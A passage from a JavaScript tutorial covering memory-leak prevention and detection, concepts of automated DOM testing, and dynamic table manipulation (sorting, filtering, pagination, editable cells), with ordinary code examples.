  elementData.set(element, data); // Element never freed if map lives
}

// Weak reference - allows GC
const elementData = new WeakMap();
function attachData(element, data) {
  elementData.set(element, data); // Element can be GCed, entry auto-removed
}
```

**[Unverified]** The exact timing of WeakMap entry removal is implementation-dependent and not guaranteed to be immediate after garbage collection.

#### Proper Event Listener Cleanup

Always remove event listeners when components are destroyed:

```javascript
class Component {
  constructor(element) {
    this.element = element;
    this.handleClick = this.handleClick.bind(this);
    this.element.addEventListener('click', this.handleClick);
  }
  
  handleClick(event) {
    // Handle click
  }
  
  destroy() {
    this.element.removeEventListener('click', this.handleClick);
    this.element = null;
  }
}
```

#### AbortController for Multiple Listeners

Use AbortController to remove multiple listeners simultaneously:

```javascript
class Component {
  constructor(element) {
    this.element = element;
    this.abortController = new AbortController();
    const { signal } = this.abortController;
    
    element.addEventListener('click', this.onClick, { signal });
    element.addEventListener('mouseover', this.onHover, { signal });
    window.addEventListener('resize', this.onResize, { signal });
  }
  
  destroy() {
    this.abortController.abort(); // Removes all listeners at once
    this.element = null;
  }
}
```

#### Timer Management

Always clear timers and intervals:

```javascript
class Widget {
  constructor() {
    this.timers = new Set();
  }
  
  addTimer(callback, delay) {
    const id = setTimeout(() => {
      callback();
      this.timers.delete(id);
    }, delay);
    this.timers.add(id);
    return id;
  }
  
  addInterval(callback, delay) {
    const id = setInterval(callback, delay);
    this.timers.add(id);
    return id;
  }
  
  destroy() {
    for (const id of this.timers) {
      clearTimeout(id); // Works for both setTimeout and setInterval
      clearInterval(id);
    }
    this.timers.clear();
  }
}
```

#### Proper Closure Scope

Limit what closures capture by using block scope and explicit parameters:

```javascript
// Bad - captures entire scope
function setupHandler(element, userData) {
  const largeArray = new Array(100000);
  const config = { /* ... */ };
  
  element.addEventListener('click', function() {
    console.log(userData.name); // Captures everything including largeArray
  });
}

// Good - limits scope
function setupHandler(element, userData) {
  const userName = userData.name; // Extract only what's needed
  
  {
    const largeArray = new Array(100000);
    const config = { /* ... */ };
    // Process data...
  } // largeArray out of scope
  
  element.addEventListener('click', function() {
    console.log(userName); // Only captures userName
  });
}
```

#### Cache Size Management

Implement bounded caches with LRU or TTL eviction:

```javascript
class LRUCache {
  constructor(maxSize) {
    this.maxSize = maxSize;
    this.cache = new Map();
  }
  
  get(key) {
    if (!this.cache.has(key)) return undefined;
    
    // Move to end (most recently used)
    const value = this.cache.get(key);
    this.cache.delete(key);
    this.cache.set(key, value);
    return value;
  }
  
  set(key, value) {
    if (this.cache.has(key)) {
      this.cache.delete(key);
    } else if (this.cache.size >= this.maxSize) {
      // Remove least recently used (first item)
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
    this.cache.set(key, value);
  }
}
```

#### DOM Reference Cleanup

Nullify DOM references when elements are removed:

```javascript
class Component {
  constructor() {
    this.container = document.createElement('div');
    this.button = document.createElement('button');
    this.input = document.createElement('input');
    this.container.appendChild(this.button);
    this.container.appendChild(this.input);
  }
  
  destroy() {
    // Remove from DOM
    this.container.remove();
    
    // Nullify references
    this.container = null;
    this.button = null;
    this.input = null;
  }
}
```

### Framework-Specific Considerations

#### React Memory Leaks

**useEffect Cleanup**

```javascript
function Component() {
  useEffect(() => {
    const handleResize = () => {
      console.log('resize');
    };
    
    window.addEventListener('resize', handleResize);
    
    // Cleanup function runs on unmount
    return () => {
      window.removeEventListener('resize', handleResize);
    };
  }, []);
}
```

**Async Operations After Unmount**

```javascript
function Component() {
  useEffect(() => {
    let cancelled = false;
    
    async function fetchData() {
      const data = await fetch('/api/data');
      if (!cancelled) {
        setData(data); // Only update if still mounted
      }
    }
    
    fetchData();
    
    return () => {
      cancelled = true; // Prevent state update after unmount
    };
  }, []);
}
```

**Closure Stale Props**

```javascript
function Component({ userId }) {
  useEffect(() => {
    // This creates a new subscription each time userId changes
    const subscription = subscribeToUser(userId, (data) => {
      // This closure captures the current userId
      console.log('Update for', userId);
    });
    
    return () => {
      subscription.unsubscribe(); // Clean up old subscription
    };
  }, [userId]); // Dependencies ensure cleanup runs when userId changes
}
```

#### Vue Memory Leaks

**Component Cleanup**

```javascript
export default {
  mounted() {
    this.handleScroll = () => {
      // Handle scroll
    };
    window.addEventListener('scroll', this.handleScroll);
  },
  
  beforeUnmount() {
    window.removeEventListener('scroll', this.handleScroll);
    this.handleScroll = null;
  }
}
```

**Event Bus Leaks**

```javascript
// Potential leak
export default {
  mounted() {
    this.$bus.$on('event', this.handleEvent);
  }
  // Missing cleanup
}

// Fixed
export default {
  mounted() {
    this.$bus.$on('event', this.handleEvent);
  },
  
  beforeUnmount() {
    this.$bus.$off('event', this.handleEvent);
  }
}
```

#### Angular Memory Leaks

**Observable Subscriptions**

```javascript
export class Component implements OnInit, OnDestroy {
  private destroy$ = new Subject<void>();
  
  ngOnInit() {
    this.dataService.getData()
      .pipe(takeUntil(this.destroy$))
      .subscribe(data => {
        this.data = data;
      });
  }
  
  ngOnDestroy() {
    this.destroy$.next();
    this.destroy$.complete();
  }
}
```

### Testing for Memory Leaks

#### Automated Leak Detection Tests

```javascript
// Puppeteer example
const puppeteer = require('puppeteer');

async function testMemoryLeak() {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  
  await page.goto('http://localhost:3000');
  
  // Get initial metrics
  const initialMetrics = await page.metrics();
  const initialJSHeap = initialMetrics.JSHeapUsedSize;
  
  // Perform actions that might leak
  for (let i = 0; i < 50; i++) {
    await page.click('#open-modal');
    await page.waitForSelector('.modal');
    await page.click('#close-modal');
    await page.waitForSelector('.modal', { hidden: true });
  }
  
  // Force garbage collection (requires --expose-gc flag)
  await page.evaluate(() => {
    if (window.gc) window.gc();
  });
  
  // Get final metrics
  const finalMetrics = await page.metrics();
  const finalJSHeap = finalMetrics.JSHeapUsedSize;
  
  const increase = finalJSHeap - initialJSHeap;
  const increasePercent = (increase / initialJSHeap) * 100;
  
  console.log(`Memory increased by ${increase} bytes (${increasePercent.toFixed(2)}%)`);
  
  // [Inference] Threshold-based detection
  if (increasePercent > 20) {
    console.warn('Potential memory leak detected');
  }
  
  await browser.close();
}
```

#### Jest Memory Leak Tests

```javascript
describe('Component memory leaks', () => {
  it('should not leak memory when mounting/unmounting', async () => {
    const iterations = 100;
    const components = [];
    
    // Create references
    for (let i = 0; i < iterations; i++) {
      const wrapper = mount(Component);
      components.push(new WeakRef(wrapper));
      wrapper.unmount();
    }
    
    // Force GC (requires --expose-gc)
    if (global.gc) {
      global.gc();
    }
    
    // Wait for GC to complete
    await new Promise(resolve => setTimeout(resolve, 100));
    
    // Check if components were collected
    const alive = components.filter(ref => ref.deref() !== undefined).length;
    
    // [Inference] Most components should be garbage collected
    expect(alive).toBeLessThan(iterations * 0.1);
  });
});
```

### Production Monitoring

#### Memory Usage Metrics

```javascript
// Track memory usage over time
class MemoryMonitor {
  constructor(reportInterval = 60000) {
    this.measurements = [];
    this.maxMeasurements = 100;
    
    if (performance.memory) {
      this.intervalId = setInterval(() => {
        this.recordMeasurement();
      }, reportInterval);
    }
  }
  
  recordMeasurement() {
    if (!performance.memory) return;
    
    const measurement = {
      timestamp: Date.now(),
      used: performance.memory.usedJSHeapSize,
      total: performance.memory.totalJSHeapSize,
      limit: performance.memory.jsHeapSizeLimit
    };
    
    this.measurements.push(measurement);
    
    if (this.measurements.length > this.maxMeasurements) {
      this.measurements.shift();
    }
    
    this.checkForAnomaly();
  }
  
  checkForAnomaly() {
    if (this.measurements.length < 10) return;
    
    const recent = this.measurements.slice(-10);
    const older = this.measurements.slice(0, -10);
    
    const recentAvg = recent.reduce((sum, m) => sum + m.used, 0) / recent.length;
    const olderAvg = older.reduce((sum, m) => sum + m.used, 0) / older.length;
    
    const increase = ((recentAvg - olderAvg) / olderAvg) * 100;
    
    // [Inference] Sustained growth might indicate leak
    if (increase > 50) {
      this.reportAnomaly(increase);
    }
  }
  
  reportAnomaly(increase) {
    // Send to monitoring service
    console.warn(`Memory anomaly detected: ${increase.toFixed(2)}% increase`);
  }
  
  stop() {
    if (this.intervalId) {
      clearInterval(this.intervalId);
    }
  }
}
```

#### Long-Running Page Detection

```javascript
// Track page lifetime and correlate with memory
class PageLifetimeTracker {
  constructor() {
    this.startTime = Date.now();
    this.checkInterval = setInterval(() => {
      this.checkLifetime();
    }, 300000); // Every 5 minutes
  }
  
  checkLifetime() {
    const lifetime = Date.now() - this.startTime;
    const hours = lifetime / (1000 * 60 * 60);
    
    if (hours > 4 && performance.memory) {
      const usage = performance.memory.usedJSHeapSize;
      const limit = performance.memory.jsHeapSizeLimit;
      const percent = (usage / limit) * 100;
      
      // [Inference] High memory after long runtime suggests leak
      if (percent > 80) {
        this.reportHighMemory(hours, percent);
      }
    }
  }
  
  reportHighMemory(hours, percent) {
    console.warn(`High memory usage after ${hours.toFixed(1)} hours: ${percent.toFixed(1)}%`);
    // Report to monitoring service
  }
}
```

This comprehensive overview covers the main techniques for detecting, analyzing, and preventing memory leaks in DOM and JavaScript environments. The actual effectiveness of detection methods **[Inference]** varies based on browser implementation, application complexity, and the specific types of leaks present.

---

## Automated DOM Testing Concepts

### Test Isolation and State Management

#### DOM State Cleanup

Each test must start with a pristine DOM state. Tests achieve isolation through several mechanisms: complete document resets between tests, clearing event listeners to prevent cross-test interference, and resetting global state including cookies, localStorage, and sessionStorage. Shadow DOM components require explicit cleanup of their internal trees. Mutation observers and intersection observers persist across tests unless explicitly disconnected.

#### Test Fixture Patterns

Fixtures provide repeatable DOM structures. The setup-teardown pattern creates fixtures before each test and destroys them after. Shared fixtures trade isolation for performance by reusing DOM structures across tests, though this risks state leakage. Factory functions generate fresh DOM elements programmatically, while template cloning leverages `<template>` elements for efficient duplication. Fragment-based fixtures build structures in document fragments before insertion, minimizing reflows.

### Query Strategies and Selectors

#### Query Resilience

Queries must balance specificity with brittleness. Test IDs (`data-testid`) provide stable hooks independent of implementation changes. ARIA attributes (`role`, `aria-label`) align tests with accessibility semantics. User-visible text queries (`getByText`, `getByLabelText`) validate what users actually experience. CSS selectors remain fragile when tied to styling classes. The query hierarchy typically prioritizes: accessibility attributes, semantic HTML, test IDs, then CSS selectors as a last resort.

#### Query Timing Strategies

Synchronous queries fail when elements don't exist immediately. Async queries poll the DOM until elements appear or timeout: `waitFor` repeatedly executes queries, `waitForElementToBeRemoved` monitors element removal, and `findBy` queries combine query + wait semantics. Custom wait conditions handle complex scenarios like specific attribute values or computed styles reaching target states.

#### Query Scope Containment

Global queries search the entire document, while scoped queries limit search domains. Container queries (`within()`) restrict searches to subtrees, reducing ambiguity and improving performance. Shadow DOM queries require explicit root access since standard queries don't pierce shadow boundaries. Frame and iframe content needs separate query contexts with explicit frame targeting.

### Event Simulation and User Interaction

#### Event Dispatch Mechanisms

DOM events follow capture-then-bubble propagation. Tests dispatch events through multiple approaches: `element.dispatchEvent(new Event())` fires native events with full propagation, while direct handler invocation (`element.onclick()`) bypasses the event system entirely. Trusted events, created by browsers, differ from untrusted synthetic events in security constraints and default behaviors.

#### Interaction-Level Testing

Low-level event dispatch fires individual events (`click`, `input`, `keydown`). User-level simulation chains events in realistic sequences: a click includes `mousedown`, `mouseup`, `click`, and potentially `dblclick`. Text input involves `keydown`, `keypress`, `input`, `keyup`, plus composition events for IME inputs. Pointer events add complexity with `pointerdown`, `pointermove`, `pointerup`, `pointercancel`, distinguishing between mouse, touch, and pen inputs.

#### Event Timing and Async Behavior

Events don't always process synchronously. `requestAnimationFrame` callbacks execute before paint, requiring tests to advance frames manually or await painting. `setTimeout` and `setInterval` introduce timing dependencies—tests either advance fake timers or use real timers with appropriate waits. Promise microtasks resolve before the next task, affecting when effects appear in the DOM. MutationObserver callbacks fire asynchronously after DOM changes batch.

### Rendering and Layout Validation

#### Visual Rendering States

The DOM contains elements in various rendering states. Visibility testing distinguishes `display: none` (not in layout), `visibility: hidden` (occupies space but invisible), and `opacity: 0` (invisible but interactive). Collapsed elements still exist in the DOM but occupy zero dimensions. Offscreen positioning places elements outside viewports while maintaining layout. Tests must verify the appropriate visibility state for the scenario.

#### Layout Geometry Verification

Element positioning and dimensions affect functionality. `getBoundingClientRect()` returns position relative to the viewport, while `offsetTop/offsetLeft` measure relative to the offset parent. Scroll positions (`scrollTop`, `scrollLeft`) affect what's visible. Element stacking with z-index determines click target precedence—`elementFromPoint()` identifies the actual interactive element at coordinates. Transforms alter visual position without affecting layout position.

#### Paint and Composite Phases

Modern browsers separate layout from painting and compositing. Layout calculates positions and dimensions. Paint creates display lists for pixels. Composite combines layers into the final image. Tests may need to force reflows (`offsetHeight` access) or wait for paints (RAF callbacks) to verify effects. Will-change and transform properties promote elements to compositor layers, affecting rendering performance observable in tests.

### Accessibility Tree Interaction

#### Accessible Name Computation

Elements expose names to assistive technologies through complex computation algorithms. Explicit labels via `aria-label` or `aria-labelledby` take precedence. Form controls use associated `<label>` elements. Buttons and links use text content. Images use `alt` attributes. Title attributes provide fallback names. Tests querying by accessible name validate both functionality and accessibility simultaneously.

#### Role and State Semantics

ARIA roles define element semantics independent of tag names. States and properties communicate dynamic information: `aria-expanded` indicates disclosure widget state, `aria-checked` shows checkbox state, `aria-disabled` marks disabled controls (distinct from the `disabled` attribute). Tests verify both the presence of semantic roles and correct state management across interactions.

#### Focus Management Testing

Focus order affects keyboard navigation. Tab order follows DOM order modified by `tabindex` values. Focus indicators must be visible (or provide alternative indication). Focus traps contain focus within modals or dialogs. Skip links allow bypassing navigation. Tests verify focus moves correctly through interactions, focus doesn't get lost, and focus indicators appear when keyboard-navigating.

### Asynchronous DOM Updates

#### Update Batching and Timing

Frameworks batch DOM updates for performance. React schedules updates and flushes them in commit phases. Vue's next tick queue batches reactive updates. Angular's zones track async operations and trigger change detection. Tests must understand framework timing to know when updates complete—`await act()` in React, `await nextTick()` in Vue, `fixture.detectChanges()` in Angular.

#### Async Data Flow Testing

Components fetch data, then update the DOM. Tests must handle loading states (skeletons, spinners), success states (rendered content), and error states (error messages). Network mocking intercepts requests to provide deterministic responses. Tests verify the DOM reflects each state correctly and transitions between states maintain proper UI feedback.

#### Observer Pattern Testing

DOM observation APIs trigger callbacks asynchronously. MutationObserver fires after DOM mutations with records describing changes. IntersectionObserver reports when elements enter/exit viewports. ResizeObserver notifies on element dimension changes. PerformanceObserver collects performance entries. Tests trigger observable conditions, then verify callbacks fired with correct data and side effects manifested in the DOM.

### Form Interaction Testing

#### Input Value Synchronization

Form controls maintain values through different properties. Text inputs have `.value` for current content, `.defaultValue` for initial HTML content. Checkboxes use `.checked` and `.defaultChecked`. Select elements have `.value`, `.selectedIndex`, and `.selectedOptions`. Tests must change values using appropriate methods—setting `.value` directly may not trigger change events, while `input.value = x; input.dispatchEvent(new Event('input'))` simulates user input more accurately.

#### Form Validation States

HTML5 validation provides built-in error checking. The `:valid` and `:invalid` pseudo-classes reflect validation state. `.validity` object exposes specific validation failures (`valueMissing`, `typeMismatch`, `patternMismatch`). `.validationMessage` contains error text. Custom validity via `.setCustomValidity()` adds programmatic validation. Tests verify validation triggers at appropriate times (input, blur, submit) and displays appropriate feedback.

#### Form Submission Flow

Form submission involves multiple steps: validation checking, submit event firing (cancellable), and submission action. Tests must distinguish between programmatic submission (`.submit()`, bypasses submit event) and user submission (button click, Enter key, fires submit event). Preventing default stops navigation. Tests verify form data serialization, validation preventing submission, and submission success/error handling.

### Component Lifecycle Testing

#### Mount and Unmount Phases

Components go through lifecycle phases affecting the DOM. Mounting inserts elements, runs initialization, attaches event listeners, and starts subscriptions. Unmounting removes elements, runs cleanup, detaches listeners, and cancels subscriptions. Tests verify proper cleanup—memory leaks from retained listeners, uncleared timers, or unresolved promises indicate cleanup failures. Remounting must produce identical results to initial mounting.

#### Update and Re-render Cycles

Component updates modify existing DOM rather than recreating it. Reconciliation algorithms (virtual DOM diffing) minimize DOM operations. Keys help identify which elements changed. Tests verify updates only modify changed portions—inefficient updates thrash the DOM unnecessarily. Update batching prevents intermediate states from appearing. Tests confirm final state correctness while optionally verifying update efficiency.

#### Suspension and Error Boundaries

Suspense-capable components pause rendering while async dependencies load. Error boundaries catch rendering errors and display fallback UI. Tests verify loading states display during suspension, error states appear for failures, and components recover when errors clear or data loads. Nested boundaries create hierarchical error handling—tests verify errors bubble to appropriate boundaries.

### Shadow DOM Testing

#### Encapsulation Boundaries

Shadow DOM creates isolated subtrees with encapsulated styles and query scope. Open shadow roots allow external JavaScript access via `.shadowRoot`. Closed shadow roots hide internal structure (though tests can still access them through various means). Tests must explicitly pierce shadow boundaries—global queries don't traverse into shadow trees automatically. Slotted content distributes light DOM children into shadow DOM slots—tests verify correct slot assignment.

#### Style Isolation Verification

Shadow DOM styles don't leak out or in (except inheritable properties). `:host` selects the shadow host. `::slotted()` targets slotted content. CSS custom properties pierce shadow boundaries, enabling theming. Tests verify component styles don't affect global styles, global styles don't affect component internals (except as designed), and theme variables propagate correctly.

#### Event Retargeting

Events crossing shadow boundaries retarget to maintain encapsulation. Event `.target` appears as the shadow host when observed outside the shadow tree. Event `.composedPath()` reveals the full propagation path through shadow trees. Tests verify events reaching outside listeners have correctly retargeted targets and `composed: true` events traverse boundaries while non-composed events remain contained.

### Performance and Rendering Optimization

#### Virtual Scrolling and Viewport Optimization

Large lists render only visible items. Virtual scrolling maintains a window of rendered elements, recycling nodes as users scroll. Tests must scroll to positions to ensure items render before querying. Intersection observers often trigger lazy rendering—tests may need to mock observer callbacks or physically scroll elements into view. Tests verify correct items render at scroll positions and recycled nodes update properly.

#### Lazy Loading and Code Splitting

Components load on-demand rather than upfront. Dynamic imports introduce timing dependencies. Tests must wait for chunks to load before components appear. Loading states provide feedback during chunk fetching. Tests verify loading indicators appear, components render after loading, and errors handle gracefully when chunks fail to load.

#### Reflow and Repaint Minimization

DOM modifications trigger reflows (layout recalculation) and repaints (pixel drawing). Reading layout properties (`.offsetHeight`, `.getBoundingClientRect()`) forces synchronous reflows. Tests detecting excessive reflows indicate inefficient implementations. Batch DOM writes before reads to minimize forced reflows. Transform and opacity changes may avoid full reflows by compositing only.

### Test Doubles and Mocking Strategies

#### DOM API Mocking

Tests often mock browser APIs unavailable in test environments. `IntersectionObserver` lacks JSDOM implementations—tests mock it to control callback invocation. `ResizeObserver` similarly needs mocking. Media query matching requires mocking `window.matchMedia()`. Viewport dimensions set through mocking window properties. Tests balance mocking enough to run while testing real behavior where possible.

#### Network Request Interception

XHR and fetch requests need deterministic responses. Service workers in tests can cause unexpected behavior—tests usually disable or mock them. Mock service workers (MSW) intercept network requests at the network layer, providing realistic request/response cycles. Inline mocking replaces fetch/XHR implementations directly. Tests verify request parameters, headers, and body content while controlling response timing and content.

#### Timer and Animation Control

Real timers create non-deterministic tests. Fake timers (`jest.useFakeTimers()`, `sinon.useFakeTimers()`) allow synchronous time advancement. Tests advance time explicitly (`jest.advanceTimersByTime(1000)`), ensuring setTimeout callbacks fire at known times. `requestAnimationFrame` advances frame-by-frame. Tests verify time-dependent behavior (debouncing, throttling, animations) without actual waiting.

### Cross-Browser and Environment Concerns

#### JSDOM Limitations

JSDOM provides a pure-JavaScript DOM implementation but lacks full browser features. Layout computation returns zeros—`offsetHeight`, `getBoundingClientRect()` don't reflect actual dimensions. No CSS cascade calculation. No rendering or painting. No visual viewport. Tests relying on computed styles, element visibility, or layout geometry need real browsers or layout calculation mocking.

#### Headless Browser Testing

Headless Chrome and Firefox provide full browser environments without windows. Layout and rendering work correctly. JavaScript execution matches production. Tests run slower than JSDOM but validate real browser behavior. Puppeteer and Playwright control browsers programmatically, enabling screenshots, PDF generation, and network interception. Tests verify visual regression and cross-browser compatibility.

#### Mobile and Touch Considerations

Touch events differ from mouse events. `touchstart`, `touchmove`, `touchend` propagate independently of click events. Multi-touch gestures involve multiple simultaneous touch points. Viewport meta tags affect mobile rendering. Tests simulate touch interactions with touch event sequences, verify touch-specific features (pinch zoom, swipe gestures), and validate responsive layouts at mobile viewports.

### Snapshot and Visual Regression Testing

#### DOM Snapshot Serialization

Snapshot testing captures DOM serialization for comparison. HTML serialization formats the DOM tree as string. Tests fail when DOM structure changes—updates require manual review. Snapshots capture too much change—tests become brittle. Partial snapshots focus on relevant subtrees. Attribute filtering ignores dynamic values (timestamps, IDs). Tests balance coverage with maintenance burden.

#### Visual Diff Testing

Screenshots capture pixel-perfect rendering. Visual regression tests compare screenshots against baselines. Pixel diff algorithms highlight changed regions. Tests account for rendering differences across browsers and platforms. Anti-aliasing differences cause false positives—tests use threshold tolerances. Dynamic content (animations, timestamps) requires masking or freezing. Tests verify visual appearance beyond structure.

#### Semantic Comparison Strategies

Custom matchers validate semantic properties rather than exact structure. `toBeVisible()` checks computed visibility. `toHaveAccessibleName()` validates accessible name computation. `toHaveStyleRule()` verifies computed styles. Semantic tests remain stable across refactoring while validating user-facing behavior. Tests express intent clearly through domain-specific assertions.

---

# Real-World Projects

## Dynamic Table Manipulation (DOM/JS)

### Direct DOM Methods for Table Manipulation

#### Accessing Table Elements

The DOM provides specialized interfaces for tables through `HTMLTableElement`, `HTMLTableSectionElement`, and `HTMLTableRowElement`.

```javascript
const table = document.querySelector('table');
const tbody = table.tBodies[0];
const thead = table.tHead;
const tfoot = table.tFoot;
```

The `rows` collection provides indexed access to all rows:

```javascript
// Access specific row
const firstRow = table.rows[0];
const lastRow = table.rows[table.rows.length - 1];

// Access cells within a row
const firstCell = firstRow.cells[0];
```

#### Inserting Rows

`insertRow()` creates and inserts a new row at the specified position:

```javascript
// Insert at end (-1 or omitted index)
const newRow = tbody.insertRow();

// Insert at specific position
const rowAtIndex = tbody.insertRow(2);

// Insert at beginning
const firstRow = tbody.insertRow(0);
```

The method returns the newly created `HTMLTableRowElement`.

#### Inserting Cells

`insertCell()` works similarly for cells within rows:

```javascript
const row = tbody.insertRow();
const cell1 = row.insertCell(0);
const cell2 = row.insertCell(1);
const cell3 = row.insertCell(); // Appends to end

cell1.textContent = 'Data';
cell2.innerHTML = '<strong>Bold Data</strong>';
```

#### Deleting Rows

`deleteRow()` removes a row at the specified index:

```javascript
// Delete specific row
table.deleteRow(0);

// Delete from tbody
tbody.deleteRow(2);

// Delete last row
table.deleteRow(-1);
```

#### Deleting Cells

`deleteCell()` removes cells from a row:

```javascript
const row = table.rows[0];
row.deleteCell(0); // Delete first cell
row.deleteCell(-1); // Delete last cell
```

### Building Tables Programmatically

#### Creating Complete Tables from Data

```javascript
function createTable(data, headers) {
  const table = document.createElement('table');
  
  // Create thead
  const thead = table.createTHead();
  const headerRow = thead.insertRow();
  headers.forEach(headerText => {
    const th = document.createElement('th');
    th.textContent = headerText;
    headerRow.appendChild(th);
  });
  
  // Create tbody
  const tbody = table.createTBody();
  data.forEach(rowData => {
    const row = tbody.insertRow();
    rowData.forEach(cellData => {
      const cell = row.insertCell();
      cell.textContent = cellData;
    });
  });
  
  return table;
}

const data = [
  ['John', 'Doe', '30'],
  ['Jane', 'Smith', '25']
];
const headers = ['First Name', 'Last Name', 'Age'];
const table = createTable(data, headers);
document.body.appendChild(table);
```

#### Creating Tables with Document Fragments

Document fragments improve performance when building large tables:

```javascript
function buildLargeTable(rowCount) {
  const table = document.createElement('table');
  const tbody = table.createTBody();
  const fragment = document.createDocumentFragment();
  
  for (let i = 0; i < rowCount; i++) {
    const row = document.createElement('tr');
    for (let j = 0; j < 5; j++) {
      const cell = document.createElement('td');
      cell.textContent = `Row ${i}, Cell ${j}`;
      row.appendChild(cell);
    }
    fragment.appendChild(row);
  }
  
  tbody.appendChild(fragment);
  return table;
}
```

### Modifying Table Content

#### Updating Cell Content

```javascript
// Direct text content
table.rows[0].cells[0].textContent = 'New Value';

// HTML content
table.rows[0].cells[1].innerHTML = '<em>Italic Text</em>';

// Setting attributes
const cell = table.rows[0].cells[2];
cell.setAttribute('data-value', '100');
cell.className = 'highlight';
```

#### Replacing Entire Rows

```javascript
function replaceRow(table, rowIndex, newData) {
  const row = table.rows[rowIndex];
  
  // Clear existing cells
  while (row.cells.length > 0) {
    row.deleteCell(0);
  }
  
  // Insert new cells
  newData.forEach(data => {
    const cell = row.insertCell();
    cell.textContent = data;
  });
}
```

#### Cloning Rows

```javascript
const originalRow = table.rows[0];
const clonedRow = originalRow.cloneNode(true); // Deep clone includes cells

// Modify cloned row before insertion
clonedRow.cells[0].textContent = 'Modified';

// Insert cloned row
tbody.appendChild(clonedRow);
```

### Sorting Tables

#### Basic Sorting Implementation

```javascript
function sortTable(table, columnIndex, ascending = true) {
  const tbody = table.tBodies[0];
  const rows = Array.from(tbody.rows);
  
  rows.sort((a, b) => {
    const aValue = a.cells[columnIndex].textContent.trim();
    const bValue = b.cells[columnIndex].textContent.trim();
    
    // Numeric comparison
    if (!isNaN(aValue) && !isNaN(bValue)) {
      return ascending ? aValue - bValue : bValue - aValue;
    }
    
    // String comparison
    return ascending 
      ? aValue.localeCompare(bValue)
      : bValue.localeCompare(aValue);
  });
  
  // Reorder rows in DOM
  rows.forEach(row => tbody.appendChild(row));
}
```

#### Sortable Table Headers

```javascript
function makeSortable(table) {
  const headers = table.querySelectorAll('th');
  
  headers.forEach((header, index) => {
    header.style.cursor = 'pointer';
    header.addEventListener('click', () => {
      const currentOrder = header.dataset.order || 'asc';
      const newOrder = currentOrder === 'asc' ? 'desc' : 'asc';
      
      // Remove order indicators from all headers
      headers.forEach(h => delete h.dataset.order);
      
      // Set new order
      header.dataset.order = newOrder;
      
      sortTable(table, index, newOrder === 'asc');
    });
  });
}
```

#### Multi-Column Sorting

```javascript
function sortTableMultiColumn(table, sortCriteria) {
  // sortCriteria: [{column: 0, ascending: true}, {column: 1, ascending: false}]
  const tbody = table.tBodies[0];
  const rows = Array.from(tbody.rows);
  
  rows.sort((a, b) => {
    for (let criterion of sortCriteria) {
      const aValue = a.cells[criterion.column].textContent.trim();
      const bValue = b.cells[criterion.column].textContent.trim();
      
      let comparison;
      if (!isNaN(aValue) && !isNaN(bValue)) {
        comparison = aValue - bValue;
      } else {
        comparison = aValue.localeCompare(bValue);
      }
      
      if (comparison !== 0) {
        return criterion.ascending ? comparison : -comparison;
      }
    }
    return 0;
  });
  
  rows.forEach(row => tbody.appendChild(row));
}
```

### Filtering Tables

#### Basic Row Filtering

```javascript
function filterTable(table, columnIndex, filterValue) {
  const rows = table.tBodies[0].rows;
  
  Array.from(rows).forEach(row => {
    const cellValue = row.cells[columnIndex].textContent.toLowerCase();
    const searchValue = filterValue.toLowerCase();
    
    if (cellValue.includes(searchValue)) {
      row.style.display = '';
    } else {
      row.style.display = 'none';
    }
  });
}
```

#### Multi-Column Search

```javascript
function searchTable(table, searchTerm) {
  const searchLower = searchTerm.toLowerCase();
  const rows = table.tBodies[0].rows;
  
  Array.from(rows).forEach(row => {
    const rowText = Array.from(row.cells)
      .map(cell => cell.textContent.toLowerCase())
      .join(' ');
    
    row.style.display = rowText.includes(searchLower) ? '' : 'none';
  });
}
```

#### Advanced Filtering with Multiple Criteria

```javascript
function advancedFilter(table, filters) {
  // filters: {columnIndex: {operator: 'equals|contains|greater|less', value: '...'}}
  const rows = table.tBodies[0].rows;
  
  Array.from(rows).forEach(row => {
    let shouldShow = true;
    
    for (let [columnIndex, filter] of Object.entries(filters)) {
      const cellValue = row.cells[columnIndex].textContent.trim();
      
      switch (filter.operator) {
        case 'equals':
          shouldShow = shouldShow && (cellValue === filter.value);
          break;
        case 'contains':
          shouldShow = shouldShow && cellValue.includes(filter.value);
          break;
        case 'greater':
          shouldShow = shouldShow && (parseFloat(cellValue) > parseFloat(filter.value));
          break;
        case 'less':
          shouldShow = shouldShow && (parseFloat(cellValue) < parseFloat(filter.value));
          break;
      }
      
      if (!shouldShow) break;
    }
    
    row.style.display = shouldShow ? '' : 'none';
  });
}
```

### Pagination

#### Client-Side Pagination

```javascript
class TablePaginator {
  constructor(table, rowsPerPage = 10) {
    this.table = table;
    this.tbody = table.tBodies[0];
    this.rowsPerPage = rowsPerPage;
    this.allRows = Array.from(this.tbody.rows);
    this.currentPage = 1;
    this.totalPages = Math.ceil(this.allRows.length / rowsPerPage);
  }
  
  showPage(pageNumber) {
    this.currentPage = Math.max(1, Math.min(pageNumber, this.totalPages));
    const start = (this.currentPage - 1) * this.rowsPerPage;
    const end = start + this.rowsPerPage;
    
    this.allRows.forEach((row, index) => {
      row.style.display = (index >= start && index < end) ? '' : 'none';
    });
  }
  
  nextPage() {
    this.showPage(this.currentPage + 1);
  }
  
  prevPage() {
    this.showPage(this.currentPage - 1);
  }
  
  goToPage(page) {
    this.showPage(page);
  }
}

// Usage
const paginator = new TablePaginator(table, 10);
paginator.showPage(1);
```

#### Dynamic Pagination Controls

```javascript
function createPaginationControls(paginator, container) {
  container.innerHTML = '';
  
  const prevBtn = document.createElement('button');
  prevBtn.textContent = 'Previous';
  prevBtn.disabled = paginator.currentPage === 1;
  prevBtn.onclick = () => {
    paginator.prevPage();
    updateControls();
  };
  
  const pageInfo = document.createElement('span');
  pageInfo.textContent = ` Page ${paginator.currentPage} of ${paginator.totalPages} `;
  
  const nextBtn = document.createElement('button');
  nextBtn.textContent = 'Next';
  nextBtn.disabled = paginator.currentPage === paginator.totalPages;
  nextBtn.onclick = () => {
    paginator.nextPage();
    updateControls();
  };
  
  function updateControls() {
    prevBtn.disabled = paginator.currentPage === 1;
    nextBtn.disabled = paginator.currentPage === paginator.totalPages;
    pageInfo.textContent = ` Page ${paginator.currentPage} of ${paginator.totalPages} `;
  }
  
  container.appendChild(prevBtn);
  container.appendChild(pageInfo);
  container.appendChild(nextBtn);
}
```

### Editable Tables

#### Making Cells Editable

```javascript
function makeCellEditable(cell) {
  cell.addEventListener('dblclick', function() {
    const originalValue = this.textContent;
    const input = document.createElement('input');
    input.value = originalValue;
    input.type = 'text';
    
    input.addEventListener('blur', function() {
      cell.textContent = this.value;
    });
    
    input.addEventListener('keydown', function(e) {
